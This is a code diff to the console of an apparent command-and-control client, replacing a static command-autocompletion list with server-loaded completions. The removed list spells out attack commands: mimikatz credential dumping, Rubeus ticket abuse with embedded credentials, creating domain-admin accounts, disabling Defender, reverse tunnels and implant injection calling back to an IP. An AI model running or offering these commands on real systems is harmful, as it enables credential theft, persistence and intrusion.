@@ -5,6 +5,7 @@ import uuid
 import json
 import logging
 from datetime import datetime
+from typing import Any
 
 from PyQt6.QtCore import QObject, Qt, QEvent, QThread, QTimer, pyqtSignal
 from PyQt6.QtGui import QStandardItem, QStandardItemModel, QTextCursor, QTextDocument, QShortcut
@@ -72,272 +73,17 @@ SYSTEM_TAB_COUNT = 5
 CmdHistoryFileName = ".cmdHistory"
 
 HelpInstruction = "help"
-SleepInstruction = "sleep"
-EndInstruction = "end"
-ListenerInstruction = "listener"
-LoadModuleInstruction = "loadModule"
+COMPLETER_REFRESH_SECONDS = 5.0
 
-AssemblyExecInstruction = "assemblyExec"
-UploadInstruction = "upload"
-RunInstruction = "run"
-DownloadInstruction = "download"
-InjectInstruction = "inject"
-ScriptInstruction = "script"
-PwdInstruction = "pwd"
-CdInstruction = "cd"
-LsInstruction = "ls"
-PsInstruction = "ps"
-CatInstruction = "cat"
-TreeInstruction = "tree"
-MakeTokenInstruction = "makeToken"
-Rev2selfInstruction = "rev2self"
-StealTokenInstruction = "stealToken"
-CoffLoaderInstruction = "coffLoader"
-UnloadModuleInstruction = "unloadModule"
-KerberosUseTicketInstruction = "kerberosUseTicket"
-PowershellInstruction = "powershell"
-ChiselInstruction = "chisel"
-PsExecInstruction = "psExec"
-WmiInstruction = "wmiExec"
-SpawnAsInstruction = "spawnAs"
-EvasionInstruction = "evasion"
-KeyLoggerInstruction = "keyLogger"
-MiniDumpInstruction = "miniDump"
-DotnetExecInstruction = "dotnetExec"
-
-StartInstruction = "start"
-StopInstruction = "stop"
-
-completerData = [
-    (HelpInstruction,[]),
-    (SleepInstruction,[]),
-    (EndInstruction,[]),
-    (ListenerInstruction,[
-            (StartInstruction+' smb pipename',[]),
-            (StartInstruction+' tcp 127.0.0.1 4444',[]),
-            (StopInstruction,  []),
-             ]),
-    (AssemblyExecInstruction,[
-                        ('-e',[
-                            ('mimikatz.exe',[
-                                ('"!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "exit"',[]),
-                                ('"privilege::debug" "lsadump::dcsync /domain:m3c.local /user:krbtgt" "exit"',[]),
-                                ('"privilege::debug" "lsadump::lsa /inject /name:joe" "exit"',[]),
-                                ('"sekurlsa::logonpasswords" "exit"',  []),
-                                ('"sekurlsa::ekeys" "exit"',  []),
-                                ('"lsadump::sam" "exit"',  []),
-                                ('"lsadump::cache" "exit"',  []),
-                                ('"lsadump::secrets" "exit"',  []),
-                                ('"dpapi::chrome /in:"""C:\\Users\\CyberVuln\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"""" "exit"', []),
-                                ('"dpapi::cred /in:C:\\Users\\joe\\AppData\\Local\\Microsoft\\Credentials\\DFBE70A7E5CC19A398EBF1B96859CE5D" "exit"', []),
-                                ('"sekurlsa::dpapi" "exit"',  []),
-                                ('"dpapi::masterkey /in:C:\\Users\\joe\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-308422719-809814085-1049341588-1001/36bf2476-ed68-4bf9-9604-c84a6e8bcb03 /rpc" "exit"',  []),
-                            ]),
-                            
-                            ('SharpView.exe Get-DomainComputer',  []),
-                            ('Rubeus.exe',[
-                                ('triage',[]),
-                                ('purge',[]),
-                                ('asktgt /user:OFFSHORE_ADM /password:Banker!123 /domain:client.offshore.com /nowrap /ptt',  []),
-                                ('s4u /user:MS02$ /aes256:a7ef524856fbf9113682384b725292dec23e54ab4e66cfdca8dd292b1bb198ae /impersonateuser:administrator /msdsspn:cifs/dc04.client.OFFSHORE.COM /altservice:host /nowrap /ptt',  []),
-                            ]),
-                            ('Seatbelt.exe',[
-                                ('-group=system',[]),
-                                ('-group=user',[]),
-                            ]),
-                            ('SharpHound.exe -c All -d dev.admin.offshore.com',  []),
-                            ('SweetPotato.exe -e EfsRpc -p C:\\Users\\Public\\Documents\\implant.exe',  []),
-                        ]),
-                    ]),
-    (UploadInstruction,[]),
-    (RunInstruction,[
-             ('cmd /c',  []),
-             ('cmd /c sc query',  []),
-             ('cmd /c wmic service where caption="Serviio" get name, caption, state, startmode',  []),
-             ('cmd /c where /r c:\\ *.txt',  []),
-             ('cmd /c tasklist /SVC',  []),
-             ('cmd /c taskkill /pid 845 /f',  []),
-             ('cmd /c schtasks /query /fo LIST /v',  []),
-             ('cmd /c net user superadmin123 Password123!* /add',  []),
-             ('cmd /c net localgroup administrators superadmin123 /add',  []),
-             ('cmd /c net user superadmin123 Password123!* /add /domain',  []),
-             ('cmd /c net group "domain admins" superadmin123 /add /domain',  []),
-             ]),
-    (DownloadInstruction,[]),
-    (InjectInstruction,[
-                ('-e BeaconHttp.exe -1 10.10.15.34 8443 https',  []),
-                ('-e implant.exe -1',  []),
-    ]),
-    (ScriptInstruction,[]),
-    (PwdInstruction,[]),
-    (CdInstruction,[]),
-    (LsInstruction,[]),
-    (PsInstruction,[]),
-    (CatInstruction,[]),
-    (TreeInstruction,[]),
-    (MakeTokenInstruction,[]),
-    (Rev2selfInstruction,[]),
-    (StealTokenInstruction,[]),
-    (CoffLoaderInstruction,[
-        ('adcs_enum.x64.o', [('go',[])]),
-        ('adcs_enum_com.x64.o', [('go ZZ hostname sharename',[])]),
-        ('adcs_enum_com2.x64.o', [('go',[])]),
-        ('adv_audit_policies.x64.o', [('go',[])]),
-        ('arp.x64.o', [('go',[])]),
-        ('cacls.x64.o', [('go zz hostname servicename',[])]),
-        ('dir.x64.o', [('go Zs targetdir subdirs',[])]),
-        ('driversigs.x64.o', [('go Zi name, 0',[])]),
-        ('enum_filter_driver.x64.o', [('go',[])]),
-        ('enumlocalsessions.x64.o', [('go zz modname procname',[])]),
-        ('env.x64.o', [('go',[])]),
-        ('findLoadedModule.x64.o', [('go',[])]),
-        ('get-netsession.x64.o', [('go',[])]),
-        ('get_password_policy.x64.o', [('go Z server',[])]),
-        ('ipconfig.x64.o', [('go',[])]),
-        ('ldapsearch.x64.o', [('go zzizz 2 attributes result_limit hostname domain',[])]),
-        ('listdns.x64.o', [('go',[])]),
-        ('listmods.x64.o', [('go i pid',[])]),
-        ('locale.x64.o', [('go',[])]),
-        ('netgroup.x64.o', [('go sZZ type server group',[])]),
-        ('netlocalgroup.x64.o', [('go',[])]),
-        ('netshares.x64.o', [('go Zi name, 1',[])]),
-        ('netstat.x64.o', [('go',[])]),
-        ('netuse.x64.o', [('go sZZZZss 1 share user password device persist requireencrypt',[])]),
-        ('netuser.x64.o', [('go ZZ 2 domain',[])]),
-        ('netuserenum.x64.o', [('go',[])]),
-        ('netview.x64.o', [('go Z domain',[])]),
-        ('nonpagedldapsearch.x64.o', [('go zzizz 2 attributes result_limit hostname domain',[])]),
-        ('nslookup.x64.o', [('go zzs lookup server type',[])]),
-        ('probe.x64.o', [('go zi host port',[])]),
-        ('reg_query.x64.o', [('go zizzi hostname hive path key, 0',[])]),
-        ('resources.x64.o', [('go',[])]),
-        ('routeprint.x64.o', [('go',[])]),
-        ('sc_enum.x64.o', [('go',[])]),
-        ('schtasksenum.x64.o', [('go ZZ 2 3',[])]),
-        ('schtasksquery.x64.o', [('go',[])]),
-        ('sc_qc.x64.o', [('go zz hostname servicename',[])]),
-        ('sc_qdescription.x64.o', [('go zz hostname servicename',[])]),
-        ('sc_qfailure.x64.o', [('go',[])]),
-        ('sc_qtriggerinfo.x64.o', [('go',[])]),
-        ('sc_query.x64.o', [('go',[])]),
-        ('tasklist.x64.o', [('go Z system',[])]),
-        ('uptime.x64.o', [('go',[])]),
-        ('vssenum.x64.o', [('go',[])]),
-        ('whoami.x64.o', [('go',[])]),
-        ('windowlist.x64.o', [('go',[])]),
-        ('wmi_query.x64.o', [('go ZZZ system namespace query',[])]),
-    ]),
-    (MiniDumpInstruction,  [
-        ('dump dump.xor',  []),
-        ('decrypt /tmp/dump.xor',  []),
-    ]),
-    (DotnetExecInstruction,  [
-        ('load rub Rubeus.exe',  []),
-        ('runExe rub help',  []),
-    ]),
-    (UnloadModuleInstruction,[
-             (AssemblyExecInstruction, []),
-             (CdInstruction, []),
-             (CoffLoaderInstruction, []),
-             (DownloadInstruction, []),
-             (InjectInstruction, []),
-             (LsInstruction, []),
-             (PsInstruction, []),
-             (MakeTokenInstruction, []),
-             (PwdInstruction, []),
-             (Rev2selfInstruction, []),
-             (RunInstruction, []),
-             (ScriptInstruction, []),
-             (StealTokenInstruction, []),
-             (UploadInstruction,  []),
-             (PowershellInstruction,  []),
-             (PsExecInstruction,  []),
-             (KerberosUseTicketInstruction,  []),
-             (ChiselInstruction,  []),
-             (EvasionInstruction,  []),
-             (SpawnAsInstruction,  []),
-             (WmiInstruction,  []),
-             (KeyLoggerInstruction,  []),
-             (MiniDumpInstruction,  []),
-             (DotnetExecInstruction,  []),
-             ]),
-    (KerberosUseTicketInstruction,[]),
-    (PowershellInstruction,[
-                ('-i PowerView.ps1',  []),
-                ('Get-Domain',  []),
-                ('Get-DomainTrust',  []),
-                ('Get-DomainUser',  []),
-                ('Get-DomainComputer -Properties DnsHostName',  []),
-                ('powershell Get-NetSession -ComputerName MS01 | select CName, UserName',  []),
-                ('-i PowerUp.ps1',  []),
-                ('Invoke-AllChecks',  []),
-                ('-i Powermad.ps1',  []),
-                ('-i PowerUpSQL.ps1',  []),
-                ('Set-MpPreference -DisableRealtimeMonitoring $true',  []),
-                ]),
-    (ChiselInstruction,[
-                ('status',  []),
-                ('stop',  []),
-                ('chisel.exe client 192.168.57.21:9001 R:socks',  []),
-                ('chisel.exe client 192.168.57.21:9001 R:445:192.168.57.14:445',  []),
-                ]),
-    (PsExecInstruction,[
-        ('10.10.10.10 implant.exe',  []),
-    ]),
-    (WmiInstruction,[
-        ('10.10.10.10 implant.exe',  []),
-    ]),
-    (SpawnAsInstruction,[
-        ('user password implant.exe',  []),
-    ]),
-    (EvasionInstruction,[
-        ('CheckHooks',  []),
-        ('Unhook',  []),
-    ]),
-    (KeyLoggerInstruction,[
-        ('start',  []),
-        ('stop',  []),
-        ('dump',  []),
-    ]),
-    (LoadModuleInstruction,[
-             ('changeDirectory', []),
-             ('listDirectory', []),
-             ('listProcesses', []),
-             ('printWorkingDirectory', []),
-             (CdInstruction, []),
-             (LsInstruction, []),
-             (PsInstruction, []),
-             (PwdInstruction, []),
-             (AssemblyExecInstruction, []),
-             (CoffLoaderInstruction, []),
-             (DownloadInstruction, []),
-             (InjectInstruction, []),
-             (MakeTokenInstruction, []),
-             (Rev2selfInstruction, []),
-             (RunInstruction, []),
-             (ScriptInstruction, []),
-             (StealTokenInstruction, []),
-             (UploadInstruction,  []),
-             (PowershellInstruction,  []),
-             (PsExecInstruction,  []),
-             (KerberosUseTicketInstruction,  []),
-             (ChiselInstruction,  []),
-             (EvasionInstruction,  []),
-             (SpawnAsInstruction,  []),
-             (WmiInstruction,  []),
-             (KeyLoggerInstruction,  []),
-             (MiniDumpInstruction,  []),
-             (DotnetExecInstruction,  []),
-             ]),
-]
+MODULE_COMMAND_ALIASES = {
+    "changedirectory": "cd",
+    "listdirectory": "ls",
+    "listprocesses": "ps",
+    "printworkingdirectory": "pwd",
+}
 
 
-def _completion_child(text):
-    text = str(text or "").strip()
-    return (text, []) if text else None
-
-
-def _completion_suffix(command_name, example):
+def _completion_suffix(command_name: Any, example: Any):
     command_name = str(command_name or "").strip()
     example = str(example or "").strip()
     if not command_name or not example:
@@ -350,79 +96,315 @@ def _completion_suffix(command_name, example):
     return example
 
 
-def _command_spec_children(command):
-    children = []
-    seen = set()
+def _entry_text(entry: tuple[str, list]) -> str:
+    return entry[0]
 
+
+def _find_entry(entries: list[tuple[str, list]], text: str):
+    for entry in entries:
+        if _entry_text(entry) == text:
+            return entry
+    return None
+
+
+def _add_completion_path(entries: list[tuple[str, list]], parts: list[str]) -> None:
+    if not parts:
+        return
+    text = str(parts[0] or "").strip()
+    if not text:
+        _add_completion_path(entries, parts[1:])
+        return
+
+    entry = _find_entry(entries, text)
+    if entry is None:
+        entry = (text, [])
+        entries.append(entry)
+    _add_completion_path(entry[1], parts[1:])
+
+
+def _add_completion_value(entries: list[tuple[str, list]], value: Any) -> None:
+    text = str(value or "").strip()
+    if text:
+        _add_completion_path(entries, text.split())
+
+
+def _merge_completion_entries(destination: list[tuple[str, list]], source: list[tuple[str, list]]) -> None:
+    for text, children in source:
+        _add_completion_path(destination, [text])
+        destination_entry = _find_entry(destination, text)
+        if destination_entry is not None and children:
+            _merge_completion_entries(destination_entry[1], children)
+
+
+def _add_example_completions(children: list[tuple[str, list]], command: Any) -> None:
+    command_name = getattr(command, "name", "")
     for example in getattr(command, "examples", []):
-        child = _completion_child(_completion_suffix(getattr(command, "name", ""), example))
-        if child and child[0] not in seen:
-            children.append(child)
-            seen.add(child[0])
-
-    for arg in getattr(command, "args", []):
-        for value in getattr(arg, "values", []):
-            child = _completion_child(value)
-            if child and child[0] not in seen:
-                children.append(child)
-                seen.add(child[0])
-
-    return children
+        suffix = _completion_suffix(command_name, example)
+        if suffix:
+            _add_completion_value(children, suffix)
 
 
-def command_specs_to_completer_data(command_specs):
-    entries = []
+def _add_first_arg_value_completions(children: list[tuple[str, list]], command: Any) -> None:
+    args = list(getattr(command, "args", []))
+    if not args:
+        return
+    for value in getattr(args[0], "values", []):
+        _add_completion_value(children, value)
+
+
+def _normalized_module_name(value: Any) -> str:
+    name = os.path.basename(str(value or "").strip())
+    if "." in name:
+        name = name.rsplit(".", 1)[0]
+    if name.lower().startswith("lib") and len(name) > 3:
+        name = name[3:]
+    if not name:
+        return ""
+    return name[0].lower() + name[1:]
+
+
+def _artifact_completion_values(artifact: Any) -> list[str]:
+    names = [
+        _normalized_module_name(getattr(artifact, "display_name", "")),
+        _normalized_module_name(getattr(artifact, "name", "")),
+        str(getattr(artifact, "display_name", "") or "").strip(),
+        str(getattr(artifact, "name", "") or "").strip(),
+    ]
+    alias = MODULE_COMMAND_ALIASES.get(names[0].lower(), "") if names and names[0] else ""
+    return _dedupe_values([alias, *names])
+
+
+def _canonical_module_completion_name(value: Any) -> str:
+    normalized = _normalized_module_name(value)
+    if not normalized:
+        return ""
+    return MODULE_COMMAND_ALIASES.get(normalized.lower(), normalized)
+
+
+def _remove_module_completions(children: list[tuple[str, list]], blocked_modules: set[str]) -> None:
+    if not blocked_modules:
+        return
+    children[:] = [
+        child
+        for child in children
+        if _canonical_module_completion_name(child[0]) not in blocked_modules
+    ]
+
+
+def _dedupe_values(values: list[Any]) -> list[str]:
+    result = []
     seen = set()
-    for command in command_specs:
-        name = str(getattr(command, "name", "") or "").strip()
-        if not name or name in seen:
+    for value in values:
+        text = str(value or "").strip()
+        if not text or text in seen:
             continue
-        entries.append((name, _command_spec_children(command)))
-        seen.add(name)
-    return entries
-
-
-def _merge_child_entries(primary, fallback):
-    merged = []
-    seen = set()
-    for text, children in [*primary, *fallback]:
-        if text in seen:
-            continue
-        merged.append((text, children))
+        result.append(text)
         seen.add(text)
-    return merged
+    return result
 
 
-def merge_completer_data(server_data, fallback_data):
-    merged = []
-    server_by_name = {text: children for text, children in server_data}
-    fallback_by_name = {text: children for text, children in fallback_data}
-
-    for text, server_children in server_data:
-        merged.append((text, _merge_child_entries(server_children, fallback_by_name.get(text, []))))
-
-    for text, fallback_children in fallback_data:
-        if text not in server_by_name:
-            merged.append((text, fallback_children))
-    return merged
+def _session_platform(session: Any | None) -> str:
+    os_text = str(getattr(session, "os", "") or "").lower()
+    if "windows" in os_text or os_text.startswith("win"):
+        return "windows"
+    if "linux" in os_text:
+        return "linux"
+    if "mac" in os_text or "darwin" in os_text or "os x" in os_text:
+        return "macos"
+    return ""
 
 
-def load_server_completer_data(grpcClient):
+def _resolve_filter_value(value: Any, session: Any | None) -> str:
+    text = str(value or "").strip()
+    if text == "session.platform":
+        return _session_platform(session)
+    if text == "session.arch":
+        return str(getattr(session, "arch", "") or "").strip()
+    return text
+
+
+def _arg_has_artifact_filter(arg: Any) -> bool:
+    if not hasattr(arg, "artifact_filter"):
+        return False
+    artifact_filter = getattr(arg, "artifact_filter")
+    if hasattr(arg, "HasField"):
+        try:
+            return bool(arg.HasField("artifact_filter"))
+        except ValueError:
+            pass
+    return artifact_filter is not None
+
+
+def _artifact_query_from_arg(arg: Any, session: Any | None) -> Any:
+    artifact_filter = getattr(arg, "artifact_filter", None)
+    query = TeamServerApi_pb2.ArtifactQuery()
+    for field_name in ("category", "scope", "target", "platform", "arch", "runtime"):
+        value = _resolve_filter_value(getattr(artifact_filter, field_name, ""), session)
+        if value:
+            setattr(query, field_name, value)
+    return query
+
+
+def _load_commands(grpcClient: Any) -> list[Any]:
     if grpcClient is None or not hasattr(grpcClient, "listCommands"):
         return []
     try:
         query = TeamServerApi_pb2.CommandQuery()
-        return command_specs_to_completer_data(list(grpcClient.listCommands(query)))
+        return list(grpcClient.listCommands(query))
     except Exception as exc:
-        logger.debug("Falling back to static command completer data: %s", exc)
+        logger.debug("Command autocomplete could not load CommandSpec catalog: %s", exc)
         return []
 
 
-def build_completer_data(grpcClient=None):
-    server_data = load_server_completer_data(grpcClient)
-    if not server_data:
-        return completerData
-    return merge_completer_data(server_data, completerData)
+def _load_current_session(grpcClient: Any, beaconHash: str, listenerHash: str) -> Any | None:
+    if grpcClient is None or not hasattr(grpcClient, "listSessions") or not beaconHash:
+        return None
+    try:
+        for session in grpcClient.listSessions():
+            if getattr(session, "beacon_hash", "") != beaconHash:
+                continue
+            if listenerHash and getattr(session, "listener_hash", "") != listenerHash:
+                continue
+            return session
+    except Exception as exc:
+        logger.debug("Command autocomplete could not load session context: %s", exc)
+    return None
+
+
+def _load_listener_hashes(grpcClient: Any) -> list[str]:
+    if grpcClient is None or not hasattr(grpcClient, "listListeners"):
+        return []
+    try:
+        return _dedupe_values([getattr(listener, "listener_hash", "") for listener in grpcClient.listListeners()])
+    except Exception as exc:
+        logger.debug("Command autocomplete could not load listener context: %s", exc)
+        return []
+
+
+def _load_modules_for_session(grpcClient: Any, beaconHash: str, listenerHash: str) -> list[Any]:
+    if grpcClient is None or not hasattr(grpcClient, "listModules") or not beaconHash:
+        return []
+    try:
+        session = TeamServerApi_pb2.SessionSelector(beacon_hash=beaconHash, listener_hash=listenerHash)
+        return list(grpcClient.listModules(session))
+    except Exception as exc:
+        logger.debug("Command autocomplete could not load module context: %s", exc)
+        return []
+
+
+def _load_artifacts_for_arg(grpcClient: Any, arg: Any, session: Any | None) -> list[Any]:
+    if grpcClient is None or not hasattr(grpcClient, "listArtifacts") or not _arg_has_artifact_filter(arg):
+        return []
+    try:
+        return list(grpcClient.listArtifacts(_artifact_query_from_arg(arg, session)))
+    except Exception as exc:
+        logger.debug("Command autocomplete could not load artifact context: %s", exc)
+        return []
+
+
+def _module_command_names(command_specs: list[Any]) -> list[str]:
+    return _dedupe_values([
+        getattr(command, "name", "")
+        for command in command_specs
+        if str(getattr(command, "kind", "") or "").lower() == "module"
+    ])
+
+
+def _tracked_module_names(modules: list[Any], states: set[str]) -> list[str]:
+    return _dedupe_values([
+        getattr(module, "name", "")
+        for module in modules
+        if str(getattr(module, "state", "") or "") in states
+    ])
+
+
+def _add_contextual_completions(
+    children: list[tuple[str, list]],
+    command: Any,
+    command_specs: list[Any],
+    grpcClient: Any,
+    session: Any | None,
+    listener_hashes: list[str],
+    tracked_modules: list[Any],
+) -> None:
+    name = str(getattr(command, "name", "") or "")
+    active_module_names = set(_tracked_module_names(tracked_modules, {"loading", "loaded", "unloading"}))
+    loaded_module_names = _tracked_module_names(tracked_modules, {"loaded"})
+
+    if name == "listener":
+        for listener_hash in listener_hashes:
+            _add_completion_path(children, ["stop", listener_hash])
+
+    if name == HelpInstruction:
+        for command_name in _dedupe_values([getattr(spec, "name", "") for spec in command_specs]):
+            if command_name != HelpInstruction:
+                _add_completion_value(children, command_name)
+
+    if name == "loadModule":
+        _remove_module_completions(children, active_module_names)
+        for module_name in _module_command_names(command_specs):
+            if module_name not in active_module_names:
+                _add_completion_value(children, module_name)
+        for arg in getattr(command, "args", []):
+            for artifact in _load_artifacts_for_arg(grpcClient, arg, session):
+                for value in _artifact_completion_values(artifact):
+                    if _canonical_module_completion_name(value) not in active_module_names:
+                        _add_completion_value(children, value)
+
+    if name == "unloadModule":
+        children.clear()
+        for module_name in loaded_module_names:
+            _add_completion_value(children, module_name)
+
+
+def command_specs_to_completer_data(
+    command_specs: list[Any],
+    grpcClient: Any = None,
+    session: Any | None = None,
+    listener_hashes: list[str] | None = None,
+    tracked_modules: list[Any] | None = None,
+):
+    entries: list[tuple[str, list]] = []
+    listener_hashes = listener_hashes or []
+    tracked_modules = tracked_modules or []
+    for command in command_specs:
+        name = str(getattr(command, "name", "") or "").strip()
+        if not name:
+            continue
+        children: list[tuple[str, list]] = []
+        _add_example_completions(children, command)
+        _add_first_arg_value_completions(children, command)
+        _add_contextual_completions(children, command, command_specs, grpcClient, session, listener_hashes, tracked_modules)
+        _add_completion_path(entries, [name])
+        entry = _find_entry(entries, name)
+        if entry is not None:
+            _merge_completion_entries(entry[1], children)
+    return entries
+
+
+def build_completer_data(grpcClient: Any = None, beaconHash: str = "", listenerHash: str = ""):
+    command_specs = _load_commands(grpcClient)
+    session = _load_current_session(grpcClient, beaconHash, listenerHash)
+    listener_hashes = _load_listener_hashes(grpcClient)
+    tracked_modules = _load_modules_for_session(grpcClient, beaconHash, listenerHash)
+    return command_specs_to_completer_data(command_specs, grpcClient, session, listener_hashes, tracked_modules)
+
+
+class CommandCompletionProvider:
+    def __init__(self, grpcClient: Any = None, beaconHash: str = "", listenerHash: str = "") -> None:
+        self.grpcClient = grpcClient
+        self.beaconHash = beaconHash
+        self.listenerHash = listenerHash
+        self._cachedData: list[tuple[str, list]] = []
+        self._loadedAt = 0.0
+
+    def build(self, force: bool = False) -> list[tuple[str, list]]:
+        now = time.monotonic()
+        if not force and self._cachedData and now - self._loadedAt < COMPLETER_REFRESH_SECONDS:
+            return self._cachedData
+        self._cachedData = build_completer_data(self.grpcClient, self.beaconHash, self.listenerHash)
+        self._loadedAt = now
+        return self._cachedData
 
 
 #
@@ -696,7 +678,11 @@ class Console(QWidget):
         self.layout.addWidget(self.editorOutput, 8)
         self.loadConsoleLog()
 
-        self.commandEditor = CommandEditor(grpcClient=self.grpcClient)
+        self.commandEditor = CommandEditor(
+            grpcClient=self.grpcClient,
+            beaconHash=self.beaconHash,
+            listenerHash=self.listenerHash,
+        )
         self.layout.addWidget(self.commandEditor, 2)
         self.commandEditor.returnPressed.connect(self.runCommand)
 
@@ -1058,11 +1044,18 @@ class GetSessionResponse(QObject):
 class CommandEditor(QLineEdit):
     tabPressed = pyqtSignal()
 
-    def __init__(self, parent: QWidget | None = None, grpcClient=None) -> None:
+    def __init__(
+        self,
+        parent: QWidget | None = None,
+        grpcClient=None,
+        beaconHash: str = "",
+        listenerHash: str = "",
+    ) -> None:
         super().__init__(parent)
 
         self.cmdHistory: list[str] = []
         self.idx: int = 0
+        self.completionProvider = CommandCompletionProvider(grpcClient, beaconHash, listenerHash)
 
         if os.path.isfile(CmdHistoryFileName):
             with open(CmdHistoryFileName) as cmdHistoryFile:
@@ -1072,13 +1065,21 @@ class CommandEditor(QLineEdit):
         QShortcut(Qt.Key.Key_Up, self, self.historyUp)
         QShortcut(Qt.Key.Key_Down, self, self.historyDown)
 
-        self.codeCompleter = CodeCompleter(build_completer_data(grpcClient), self)
+        self.completionData = self.completionProvider.build(force=True)
+        self.codeCompleter = CodeCompleter(self.completionData, self)
         # needed to clear the completer after activation
         self.codeCompleter.activated.connect(self.onActivated)
         self.setCompleter(self.codeCompleter)
         self.tabPressed.connect(self.nextCompletion)
 
+    def refreshCompleter(self, force: bool = False):
+        completionData = self.completionProvider.build(force=force)
+        if completionData != self.completionData:
+            self.completionData = completionData
+            self.codeCompleter.updateData(completionData)
+
     def nextCompletion(self):
+        self.refreshCompleter()
         index = self.codeCompleter.currentIndex()
         self.codeCompleter.popup().setCurrentIndex(index)
         start = self.codeCompleter.currentRow()
@@ -1120,6 +1121,9 @@ class CodeCompleter(QCompleter):
 
     def __init__(self, data, parent=None):
         super().__init__(parent)
+        self.createModel(data)
+
+    def updateData(self, data):
         self.createModel(data)
 
     def splitPath(self, path):
